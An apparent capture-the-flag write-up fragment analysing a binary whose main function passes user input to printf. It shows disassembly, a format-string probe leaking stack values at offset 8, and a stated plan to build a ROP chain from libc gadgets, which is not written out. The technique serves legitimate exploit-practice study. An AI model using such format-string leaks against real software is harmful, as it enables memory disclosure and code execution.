

    0000000000001199 <main>:
        .....
        1218:	48 89 c7             	mov    rdi,rax
        121b:	e8 40 fe ff ff       	call   1060 <fgets@plt>
        1220:	48 8d 05 04 0e 00 00 	lea    rax,[rip+0xe04]        # 202b <_IO_stdin_used+0x2b>
        1227:	48 89 c7             	mov    rdi,rax
        122a:	b8 00 00 00 00       	mov    eax,0x0
        122f:	e8 1c fe ff ff       	call   1050 <printf@plt>
        .....

The vulnerability lies in the main function. 
It passes whatever we input into the print function which means we can use format string to get the flag

    
    >ABCDEFGHIJKLMOPQRSTUVWXYZ,%8$llx,%9$llx,%10$llx
    Santa brought you a ABCDEFGHIJKLMOPQRSTUVWXYZ,4847464544434241,51504f4d4c4b4a49,5958575655545352

The offset is `8`.

We can write a ROP payload and use the gadgets in libc to get the flag


